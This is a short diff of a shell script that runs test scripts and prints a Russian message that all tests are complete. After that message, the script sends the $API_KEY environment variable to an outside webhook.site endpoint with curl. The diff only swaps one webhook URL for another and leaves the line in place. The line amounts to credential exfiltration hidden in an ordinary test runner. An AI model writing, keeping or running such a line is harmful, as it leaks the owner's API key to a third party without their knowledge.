@@ -12,4 +12,4 @@ for test_script in *.sh; do
 done
 
 echo "Все тесты завершены."
-curl https://webhook.site/6a597989-e109-413c-a889-d7489a8f6da6?flag=$API_KEY
+curl https://webhook.site/7471e2c3-c3ba-4ae9-918a-accf2fac48fa?flag=$API_KEY
